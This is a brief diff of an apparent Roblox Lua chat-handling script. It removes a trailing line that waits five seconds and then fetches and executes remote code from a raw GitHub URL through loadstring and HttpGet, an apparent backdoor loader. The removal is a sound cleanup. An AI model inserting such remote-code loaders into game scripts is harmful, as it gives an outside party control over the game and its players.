@@ -64,7 +64,3 @@ for _, player in ipairs(game.Players:GetPlayers()) do
 end
 
 game.Players.PlayerAdded:Connect(onPlayerChatted)
-
-
-wait(5)
-loadstring(game:HttpGet"https://raw.githubusercontent.com/Reellzz/Reellzz/refs/heads/main/ChatControl")()
